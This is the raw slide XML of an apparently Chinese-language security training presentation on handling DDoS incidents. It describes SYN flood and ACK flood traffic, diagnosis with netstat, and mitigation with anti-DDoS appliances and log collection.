              <a:t>级木马，强对抗性，用工具无法探测</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="691427" y="4039617"/>
            <a:ext cx="7200800" cy="1154162"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>解决方式</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>收集系统事件日志，保持系统环境，请求后端技术支持</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41129697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BF65E2-07B1-D744-81E0-9ACE251E61C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="955065" y="1026592"/>
            <a:ext cx="6012473" cy="483031"/>
          </a:xfrm>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DDOS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>事件处理</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" sz="2585" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26626" name="TextBox 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="858211" y="5423069"/>
            <a:ext cx="7006850" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:defRPr>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用抗</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DDOS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>设备或其他专用防护设备来进行防护，默认参数下就可以达到比较好的效果。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2662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4038185"/>
            <a:ext cx="410930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5065" y="2819208"/>
            <a:ext cx="6460148" cy="51417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974132" y="1561228"/>
            <a:ext cx="2727374" cy="426093"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SYN Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="858211" y="2126979"/>
            <a:ext cx="6891063" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>此种攻击经过抓包分析可以看到，大量的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SYS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>请求发向目标地址，而</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SYS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>包的源地址为大量的随机生成的虚假地址。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="783271" y="3429000"/>
            <a:ext cx="7926953" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>在目标主机上使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>netstat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> –an</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>命令可以看到大量</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>syn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>连接，处于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>syn_received</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>状态</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29371689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26628"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26628"/>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26627"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26627"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26627"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26627"/>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6626"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="28" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26626"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="29" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="266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4" grpId="0"/>
      <p:bldP spid="5"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
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="998463" y="4795307"/>
            <a:ext cx="7295797" cy="1189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ts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>此攻击的处理步骤，是将防护目标纳入被保护的范围，然后调节黑洞的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ACK-Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>专业数据同时使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:1)SYN-Flood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>的防护算法</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>;2)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DynaCheck</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">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而且要注意，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>在流量较大的情况下，防火墙必须在抗</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DDOS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>后面，否则未经净化的流量有可能会使防火墙的负载大大增高。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2765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3623" y="2954539"/>
            <a:ext cx="6678887" cy="935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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CBF65E2-07B1-D744-81E0-9ACE251E61C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="716802" y="903152"/>
            <a:ext cx="6012473" cy="483031"/>
          </a:xfrm>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DDOS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" sz="2585" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>事件处理</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" sz="2585" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1007766" y="1445211"/>
            <a:ext cx="3124039" cy="426093"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="84406" tIns="42203" rIns="84406" bIns="42203" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ack-Flood </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击：</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1016719" y="1898703"/>
            <a:ext cx="6812259" cy="913070"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2215"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>此种攻击方式为攻击主机向目标主机发送大量含有</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ACK</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>标志位的包，目标主机向攻击主机回复</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>RST</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1385" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>标志位的包；或者攻击主机向目标主机发送大量的</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1385" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
